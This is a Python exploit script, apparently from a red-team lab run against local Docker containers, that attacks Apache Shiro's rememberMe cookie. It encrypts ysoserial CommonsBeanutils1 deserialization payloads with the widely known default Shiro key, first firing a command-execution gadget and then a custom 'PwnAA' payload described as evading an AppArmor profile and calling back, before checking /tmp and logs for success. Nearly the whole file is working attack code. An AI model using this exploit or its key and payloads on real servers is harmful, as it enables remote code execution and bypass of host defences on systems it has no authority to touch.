# -*- coding: utf-8 -*-
"""RT-4 Shiro firing: RV (official CB1, expected blocked) + PwnAA weapon, then truth."""
import base64
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "shiro"))

from common import gen_yso, session  # noqa: E402
from shiro_exp import encrypt_rememberme  # noqa: E402

KEY = "kPH+bIxk5D2deZiIxcaaaA=="
s = session()

# 1) RV: official ysoserial CB1 -> Runtime.exec touch /tmp/... (expected: exec denied by aa-shiro)
rv_ser = gen_yso("CommonsBeanutils1", "touch /tmp/pwn_rt4_shiro_rv",
                 os.path.join(HERE, "out", "rt4_rv.ser"))
val = encrypt_rememberme(open(rv_ser, "rb").read(), KEY).decode()
r = s.get("http://127.0.0.1:18083/", headers={"Cookie": "rememberMe=" + val},
          timeout=30, allow_redirects=False)
print("[*] RV official CB1 -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

# 2) Weapon: PwnAA bytecode in CB1 (pure-Java writes into profile-allowed prefixes + callback)
pwn_ser = os.path.join(HERE, "rt4", "out_rt4.ser")
val = encrypt_rememberme(open(pwn_ser, "rb").read(), KEY).decode()
r = s.get("http://127.0.0.1:18083/", headers={"Cookie": "rememberMe=" + val},
          timeout=30, allow_redirects=False)
print("[*] PwnAA CB1 -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

print("\n=== truth: /tmp -R ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-shiro-1", "ls", "-lR", "--full-time",
                    "/tmp"], capture_output=True, text=True)
print(r.stdout)
print("=== infra log (rt4) ===")
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "5m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
